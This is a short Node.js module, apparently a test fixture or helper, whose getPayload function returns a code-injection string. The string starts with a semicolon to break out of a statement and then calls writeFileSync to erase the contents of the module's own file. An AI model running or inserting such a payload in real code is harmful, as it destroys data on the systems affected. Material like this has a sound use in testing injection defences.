function getPayload() {
    return `
        ; require('fs').writeFileSync('${__filename}', '');
    `;
}

module.exports = { getPayload };